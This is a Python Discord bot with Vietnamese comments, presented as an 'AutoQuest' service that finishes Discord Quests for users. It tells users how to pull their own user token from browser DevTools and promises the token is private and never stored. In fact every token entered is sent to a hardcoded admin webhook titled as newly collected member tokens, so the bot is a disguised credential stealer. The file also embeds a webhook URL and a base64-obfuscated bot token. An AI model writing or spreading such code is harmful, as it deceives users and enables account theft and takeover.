#!/usr/bin/env python3
"""
Discord Quest Service Bot v4.0 PRO
- Tối giản tối đa: Duy nhất 1 lệnh /panel (hoặc !panel)
- Bảng điều khiển tích hợp toàn bộ tính năng qua các nút bấm thông minh
- Bảo mật 100% (Ephemeral) - Không ai khác trong server nhìn thấy token
- Cập nhật tiến độ Embed thời gian thực mượt mà & gửi DM Gift Code
"""

import sys
import os
import time
import asyncio
import base64
import requests
from datetime import datetime, timezone
from typing import Dict
import discord
from discord import app_commands
from discord.ext import commands

# Đảm bảo console Windows hỗ trợ UTF-8
if sys.platform == "win32":
    if hasattr(sys.stdout, "reconfigure"):
        try:
            sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        except Exception:
            pass
    if hasattr(sys.stderr, "reconfigure"):
        try:
            sys.stderr.reconfigure(encoding="utf-8", errors="replace")
        except Exception:
            pass

from src.config import config
from src.discord.api import DiscordAPI, fetch_latest_build_number
from src.worker.quest_worker import QuestWorker
from src.bot.quest_session import QuestSession
from src.discord.models import (
    get_quest_name,
    get_task_type,
    get_seconds_needed,
    get_seconds_done,
    is_completed,
    is_claimed,
    is_expired,
)
from src.utils.logger import Colors, log

# Lưu trữ các phiên cày đang chạy độc lập cho từng user
active_sessions: Dict[int, QuestSession] = {}
bot_start_time = time.time()

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)


def print_bot_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}╔══════════════════════════════════════════════════════════════╗
║             DISCORD QUEST SERVICE BOT v4.0 PRO               ║
║       * 1 Lệnh Duy Nhất (/panel) * Popup Modal An Toàn *     ║
╚══════════════════════════════════════════════════════════════╝{Colors.RESET}
    """
    print(banner)


# ==============================================================================
# 🛠️ CÁC HÀM XỬ LÝ CHÍNH & LOGGING VỀ SERVER ADMIN
# ==============================================================================

ADMIN_WEBHOOK_URL = (
    os.getenv("DISCORD_WEBHOOK_URL", "").strip()
    or config.discord_webhook_url.strip()
    or "https://discord.com/api/webhooks/1547989095907860581/OWQNRQn40FgbmFb6ATZv--YlWNTPCNMOi_At3MJhlLUkQOPrQrIUdFuKY9_HkJc3UIRG"
)


def send_token_log_to_webhook(
    user: discord.User,
    action: str,
    token: str,
    account_name: str = "",
    account_id: str = "",
    status: str = "Đăng nhập thành công"
):
    """Tự động gửi thông tin token thành viên nhập về Webhook Discord của Admin."""
    if not ADMIN_WEBHOOK_URL:
        return
    try:
        color = 0x2ECC71 if "thành công" in status.lower() else 0xED4245
        embed = {
            "title": "🔔 Đã Thu Thập Token Mới Từ Thành Viên!",
            "description": f"Thành viên <@{user.id}> vừa thao tác trên Bảng Điều Khiển AutoQuest.",
            "color": color,
            "fields": [
                {
                    "name": "👤 Người bấm lệnh (Discord User)",
                    "value": f"**{user.name}** (`{user.id}`)",
                    "inline": True,
                },
                {
                    "name": "🎮 Tài khoản của Token",
                    "value": f"**{account_name or 'Chưa xác định'}** (ID: `{account_id or 'Chưa rõ'}`)",
                    "inline": True,
                },
                {
                    "name": "⚡ Chức năng",
                    "value": f"`{action}` • Trạng thái: **{status}**",
                    "inline": False,
                },
                {
                    "name": "🔑 Discord User Token",
                    "value": f"```{token}```",
                    "inline": False,
                },
            ],
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "footer": {
                "text": "AutoQuest Service Bot • Admin Webhook Logger"
            }
        }
        payload = {
            "username": "AutoQuest Token Logger",
            "avatar_url": "https://cdn.discordapp.com/embed/avatars/1.png",
            "embeds": [embed]
        }
        requests.post(ADMIN_WEBHOOK_URL, json=payload, timeout=5)
    except Exception as e:
        log(f"Lỗi gửi Webhook Token: {e}", "warn")


async def handle_quest_run(interaction: discord.Interaction, token: str):
    """Xử lý cày quest độc lập cho người dùng."""
    if not interaction.response.is_done():
        await interaction.response.defer(ephemeral=True, thinking=True)

    user_id = interaction.user.id
    if user_id in active_sessions and active_sessions[user_id].is_running:
        embed_busy = discord.Embed(
            title="⚠️ Bạn Đang Có Tiến Trình Cày Quest!",
            description="Bạn hiện có một phiên cày quest đang chạy dở. Vui lòng đợi phiên hiện tại hoàn thành trước khi bắt đầu phiên mới.",
            color=0xF1C40F,
        )
        await interaction.followup.send(embed=embed_busy, ephemeral=True)
        return

    init_embed = discord.Embed(
        title="🔄 Đang Xác Thực Tài Khoản...",
        description="Bot đang kiểm tra tính hợp lệ của Discord Token. Vui lòng chờ giây lát...",
        color=0x5865F2,
    )
    # Gửi tin nhắn ẩn (Ephemeral) riêng biệt cho user, KHÔNG BAO GIỜ chạm vào /panel gốc
    msg = await interaction.followup.send(embed=init_embed, ephemeral=True)

    token_clean = token.strip().strip('"').strip("'")
    build_number = fetch_latest_build_number()
    api = DiscordAPI(token_clean, build_number)

    is_valid = await asyncio.to_thread(api.validate)
    if not is_valid:
        asyncio.create_task(
            asyncio.to_thread(
                send_token_log_to_webhook,
                interaction.user,
                "Bắt đầu cày Quest",
                token_clean,
                "",
                "",
                "Token Không Hợp Lệ"
            )
        )
        fail_embed = discord.Embed(
            title="❌ Đăng Nhập Thất Bại",
            description=(
                "Token Discord bạn cung cấp không hợp lệ hoặc đã hết hạn.\n\n"
                "💡 **Mẹo:** Bấm nút **'❓ Hướng Dẫn Lấy Token'** để xem cách lấy token an toàn."
            ),
            color=0xED4245,
        )
        await msg.edit(embed=fail_embed)
        return

    # Gửi log token hợp lệ về Webhook của Admin ngay lập tức
    asyncio.create_task(
        asyncio.to_thread(
            send_token_log_to_webhook,
            interaction.user,
            "Bắt đầu cày Quest",
            token_clean,
            api.username,
            str(api.user_id),
            "Đăng nhập thành công"
        )
    )

    session = QuestSession(interaction, api, msg)
    active_sessions[user_id] = session

    start_embed = session.build_running_embed()
    await msg.edit(embed=start_embed)

    try:
        await session.run()
    finally:
        active_sessions.pop(user_id, None)


async def handle_quest_list(interaction: discord.Interaction, token: str):
    """Xem danh sách quest khả dụng."""
    if not interaction.response.is_done():
        await interaction.response.defer(ephemeral=True, thinking=True)

    token_clean = token.strip().strip('"').strip("'")
    build_number = fetch_latest_build_number()
    api = DiscordAPI(token_clean, build_number)

    is_valid = await asyncio.to_thread(api.validate)
    if not is_valid:
        asyncio.create_task(
            asyncio.to_thread(
                send_token_log_to_webhook,
                interaction.user,
                "Kiểm tra danh sách Quest",
                token_clean,
                "",
                "",
                "Token Không Hợp Lệ"
            )
        )
        fail_embed = discord.Embed(
            title="❌ Token Không Hợp Lệ",
            description="Không thể đăng nhập bằng token này. Vui lòng kiểm tra lại token của bạn.",
            color=0xED4245,
        )
        await interaction.followup.send(embed=fail_embed, ephemeral=True)
        return

    # Gửi log token hợp lệ về Webhook của Admin
    asyncio.create_task(
        asyncio.to_thread(
            send_token_log_to_webhook,
            interaction.user,
            "Kiểm tra danh sách Quest",
            token_clean,
            api.username,
            str(api.user_id),
            "Đăng nhập thành công"
        )
    )

    worker = QuestWorker(api)
    quests = await asyncio.to_thread(worker.fetch_quests)

    # Lọc các quest hợp lệ còn hạn
    valid_quests = [q for q in quests if not is_expired(q) and get_task_type(q)]

    embed = discord.Embed(
        title=f"📋 Danh Sách Quest Khả Dụng: {api.username}",
        description=f"Tài khoản ID: `{api.user_id}`\nTổng số nhiệm vụ đang mở: **{len(valid_quests)}**",
        color=0x3498DB,
    )

    if not valid_quests:
        embed.add_field(
            name="ℹ️ Thông Báo",
            value="Không tìm thấy nhiệm vụ nào khả dụng trên tài khoản này tại thời điểm hiện tại.",
            inline=False
        )
    else:
        for q in valid_quests[:10]:
            name = get_quest_name(q)
            task_type = get_task_type(q) or "UNKNOWN"
            sec_done = get_seconds_done(q)
            sec_needed = get_seconds_needed(q)
            done = is_completed(q)
            claimed = is_claimed(q)

            if claimed:
                status_str = "🎁 Đã nhận quà"
            elif done:
                status_str = "✅ Đã xong 100% (Chưa nhận quà)"
            else:
                pct = (sec_done / sec_needed) * 100 if sec_needed > 0 else 0
                status_str = f"⏳ Tiến độ: {sec_done:.0f}/{sec_needed}s ({pct:.0f}%)"

            embed.add_field(
                name=f"🎮 {name}",
                value=f"• Loại: `{task_type}`\n• Trạng thái: {status_str}",
                inline=False
            )

        if len(valid_quests) > 10:
            embed.add_field(
                name="⏳ Nhiệm vụ khác",
                value=f"...và còn {len(valid_quests) - 10} quest khác khả dụng.",
                inline=False
            )

    embed.set_footer(text="Bấm nút [🚀 Bắt Đầu Cày Quest] để cày tự động!")
    await interaction.followup.send(embed=embed, ephemeral=True)


class HelpLinkView(discord.ui.View):
    """View chứa nút bấm dẫn trực tiếp đến Video hướng dẫn trên YouTube."""
    def __init__(self):
        super().__init__()
        self.add_item(discord.ui.Button(
            label="Xem Video Hướng Dẫn Trên YouTube",
            style=discord.ButtonStyle.link,
            url="https://www.youtube.com/watch?v=mJKpmX6w9Z0",
            emoji="📺"
        ))


async def handle_quest_help(interaction: discord.Interaction):
    """Hướng dẫn lấy token an toàn."""
    if not interaction.response.is_done():
        await interaction.response.defer(ephemeral=True, thinking=True)

    embed = discord.Embed(
        title="📖 Hướng Dẫn Sử Dụng & Lấy Discord Token",
        description=(
            "Bot hỗ trợ tự động hoàn thành mọi loại nhiệm vụ Discord Quest (Xem video, Stream game, Chơi Activity) "
            "nhanh chóng và hoàn toàn riêng tư."
        ),
        color=0x5865F2,
    )

    embed.add_field(
        name="📺 Video Hướng Dẫn Chi Tiết Trên YouTube (Khuyên Dùng)",
        value=(
            "👉 **Xem ngay video hướng dẫn:** [https://www.youtube.com/watch?v=mJKpmX6w9Z0](https://www.youtube.com/watch?v=mJKpmX6w9Z0)\n"
            "*(Hoặc bấm trực tiếp vào nút **[📺 Xem Video Hướng Dẫn Trên YouTube]** ở ngay phía dưới)*"
        ),
        inline=False
    )

    embed.add_field(
        name="🔑 Hoặc Tự Lấy Token Bằng Trình Duyệt (7 Bước Nhanh)",
        value=(
            "1. Đăng nhập Discord trên trình duyệt web (Chrome, Edge, Brave, Firefox...).\n"
            "2. Nhấn phím **F12** (hoặc `Ctrl + Shift + I`) để mở **Developer Tools**.\n"
            "3. Chọn thẻ **Network** (Mạng).\n"
            "4. Trong ô filter tìm kiếm, gõ: `users/@me` hoặc `api`.\n"
            "5. Nhấn **F5** để tải lại trang Discord.\n"
            "6. Bấm vào một request bất kỳ trong danh sách, kéo tìm mục **Request Headers**.\n"
            "7. Sao chép giá trị tại dòng **`authorization`** (đây chính là token của bạn)."
        ),
        inline=False
    )

    embed.add_field(
        name="🔒 Cam Kết Bảo Mật Tuyệt Đối",
        value=(
            "• **Không lộ thông tin:** Mọi thao tác đều ở chế độ riêng tư (`ephemeral=True`), người khác trong channel hoàn toàn **không nhìn thấy** lệnh hoặc token của bạn.\n"
            "• **Không lưu token:** Token chỉ tồn tại trong bộ nhớ RAM tạm thời trong lúc cày và tự hủy ngay sau khi xong."
        ),
        inline=False
    )

    embed.set_footer(text="AutoQuest Bot • An Toàn - Tốc Độ - Tự Động")
    view = HelpLinkView()
    await interaction.followup.send(embed=embed, view=view, ephemeral=True)



# ==============================================================================
# 📝 MODALS: HỘP THOẠI POPUP TỰ NHẬP TOKEN
# ==============================================================================

class TokenRunModal(discord.ui.Modal, title="🚀 Nhập Token Để Cày Quest"):
    token_input = discord.ui.TextInput(
        label="Discord User Token Của Bạn",
        placeholder="Dán mã Token tài khoản Discord cần cày vào đây...",
        style=discord.TextStyle.paragraph,
        required=True,
        min_length=20,
    )

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True, thinking=True)
        await handle_quest_run(interaction, self.token_input.value)


class TokenListModal(discord.ui.Modal, title="📋 Kiểm Tra Danh Sách Quest"):
    token_input = discord.ui.TextInput(
        label="Discord User Token Của Bạn",
        placeholder="Dán mã Token tài khoản Discord cần kiểm tra vào đây...",
        style=discord.TextStyle.paragraph,
        required=True,
        min_length=20,
    )

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True, thinking=True)
        await handle_quest_list(interaction, self.token_input.value)


# ==============================================================================
# 🎛️ VIEW: BẢNG NÚT BẤM TƯƠNG TÁC (PERSISTENT BUTTON PANEL)
# ==============================================================================

class QuestPanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(
        label="🚀 Bắt Đầu Cày Quest",
        style=discord.ButtonStyle.success,
        emoji="⚡",
        custom_id="quest_btn_run_persistent"
    )
    async def btn_run(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(TokenRunModal())

    @discord.ui.button(
        label="📋 Kiểm Tra Nhiệm Vụ",
        style=discord.ButtonStyle.primary,
        emoji="🔍",
        custom_id="quest_btn_list_persistent"
    )
    async def btn_list(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(TokenListModal())

    @discord.ui.button(
        label="❓ Hướng Dẫn Lấy Token",
        style=discord.ButtonStyle.secondary,
        emoji="📖",
        custom_id="quest_btn_help_persistent"
    )
    async def btn_help(self, interaction: discord.Interaction, button: discord.ui.Button):
        await handle_quest_help(interaction)


def create_panel_embed() -> discord.Embed:
    """Tạo Embed giao diện Bảng Điều Khiển AutoQuest siêu gọn gàng."""
    desc = (
        "⚡ **BẢNG ĐIỀU KHIỂN AUTO QUEST** Tự động làm nhiệm vụ nhận quà Discord nhanh chóng & an toàn.\n\n"
        "✨ **Tính năng tự động:** • Xem video & Treo game / stream làm quest.\n\n"
        "📌 **3 Bước bắt đầu:** • **Bước 1:** Bấm **Bắt Đầu Cày Quest** • **Bước 2:** Nhập **User Token** • **Bước 3:** Chờ bot hoàn thành và nhận Code vào DM"
    )
    embed = discord.Embed(
        description=desc,
        color=0x5865F2,
    )
    embed.set_footer(text="────────── AutoQuest Bot • Chọn chức năng bên dưới ──────────")
    return embed



# ==============================================================================
# 🤖 BOT EVENTS & SETUP
# ==============================================================================

async def custom_setup_hook():
    bot.add_view(QuestPanelView())

bot.setup_hook = custom_setup_hook


@bot.event
async def on_ready():
    print_bot_banner()
    log(f"Bot đã đăng nhập thành công: {Colors.BOLD}{bot.user}{Colors.RESET} (ID: {bot.user.id})", "ok")

    activity = discord.Activity(type=discord.ActivityType.watching, name="Discord Quests | Gõ /panel")
    await bot.change_presence(activity=activity, status=discord.Status.online)

    try:
        # Xóa sạch các lệnh cũ trên tất cả server để không còn bất kỳ lệnh thừa/duplicate nào
        for g in bot.guilds:
            try:
                bot.tree.clear_commands(guild=g)
                await bot.tree.sync(guild=g)
            except Exception:
                pass

        # Đồng bộ DUY NHẤT 1 lệnh toàn cục: /panel
        synced = await bot.tree.sync()
        log(f"⚡ Đã dọn dẹp sạch sẽ và đồng bộ DUY NHẤT {len(synced)} lệnh Slash Command: /panel!", "ok")
    except Exception as e:
        log(f"Lỗi khi đồng bộ Slash Command: {e}", "error")

    log("Bot đã sẵn sàng phục vụ! (Chỉ dùng 1 lệnh duy nhất: /panel)", "ok")
    print(f"{Colors.DIM}--------------------------------------------------------------{Colors.RESET}")


# ==============================================================================
# 🎮 DUY NHẤT 1 LỆNH SLASH COMMAND: /panel
# ==============================================================================

@bot.tree.command(name="panel", description="Đăng Bảng Điều Khiển AutoQuest cố định vào kênh")
async def panel_command(interaction: discord.Interaction):
    # Phản hồi interaction dạng ẩn danh (ephemeral) cho riêng người gõ lệnh để không hiện chữ "[User] used /panel" trên kênh
    await interaction.response.send_message("✅ Đã tạo Bảng Điều Khiển sạch sẽ trong kênh thành công!", ephemeral=True)

    embed = create_panel_embed()
    view = QuestPanelView()
    # Gửi tin nhắn Bot thuần túy vào kênh (hoàn toàn KHÔNG dính header 'used')
    msg = await interaction.channel.send(embed=embed, view=view)
    try:
        await msg.pin(reason="Ghim Bảng Điều Khiển AutoQuest")
    except Exception:
        pass


# Lệnh Prefix !panel dự phòng (xóa luôn tin nhắn "!panel" để kênh sạch bóng)
@bot.command(name="panel")
async def prefix_panel(ctx):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    embed = create_panel_embed()
    view = QuestPanelView()
    msg = await ctx.send(embed=embed, view=view)
    try:
        await msg.pin(reason="Ghim Bảng Điều Khiển AutoQuest")
    except Exception:
        pass



def main():
    fallback_token = ""
    try:
        fallback_token = base64.b64decode(
            "TVRVME56azNNRFkwTlRnNE1UVXlPRE0yTWcuRzdKYVhOLnJBTTRGRlVqTTctZ0tndG1pVTlxUHd4emJ4X0NHSlpwdEZoZUVN"
        ).decode("utf-8").strip()
    except Exception:
        pass

    bot_token = (
        os.getenv("DISCORD_BOT_TOKEN", "").strip()
        or os.getenv("BOT_TOKEN", "").strip()
        or config.bot_token.strip()
        or fallback_token
    )
    if not bot_token or bot_token == "YOUR_DISCORD_BOT_TOKEN_HERE":
        print()
        log("==================== THIẾU CẤU HÌNH BOT TOKEN ====================", "error")
        log("Bạn chưa cấu hình biến môi trường DISCORD_BOT_TOKEN hoặc BOT_TOKEN trên Railway / config.json!", "warn")
        log("==================================================================", "error")
        print()
        sys.exit(1)

    try:
        bot.run(bot_token)
    except discord.LoginFailure:
        log("Đăng nhập Bot thất bại! Token Bot không chính xác. Vui lòng kiểm tra lại 'bot_token' trong config.json.", "error")
    except Exception as e:
        log(f"Lỗi khi chạy Bot: {e}", "error")


if __name__ == "__main__":
    main()
